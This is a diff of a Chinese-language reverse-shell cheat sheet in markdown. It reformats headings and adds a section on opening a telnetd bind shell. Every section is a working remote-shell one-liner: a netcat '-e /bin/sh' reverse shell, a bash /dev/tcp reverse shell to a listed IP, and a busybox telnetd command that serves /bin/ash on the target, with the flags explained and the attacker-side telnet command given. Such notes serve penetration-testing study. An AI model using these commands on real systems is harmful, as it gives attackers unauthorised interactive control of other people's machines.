@@ -1,4 +1,4 @@
-0x06 NetCat
+### NetCat
 ```
 nc -e /bin/sh 10.0.0.1 1234　　#不同版本的nc不一定支持-e选项
 ```
@@ -16,7 +16,7 @@ https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html
 
 ---
 
-bash直接反弹
+### bash直接反弹
 靶机
 ```
 bash -i >& /dev/tcp/192.168.86.131/8080 0>&1
@@ -26,3 +26,20 @@ bash -i >& /dev/tcp/192.168.86.131/8080 0>&1
 
 
 https://www.smi1e.top/linux-%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/
+
+
+### telnetd启动服务
+靶机：
+```
+busybox telnetd -b XXX.XXX.XXX.XXX -p 1234 -l /bin/ash
+```
+busybox 不一定要加，看telnetd是否直接可用（配好了环境变量之类吧）
+telnetd 启动telnet服务
+-b 是bind到靶机外网能访问的网卡ip
+-p 监听端口
+-l 指定客户telnet之后所用shell
+
+攻击机：
+```
+telnet XXX.XXX.XXX.XXX 1234
+```
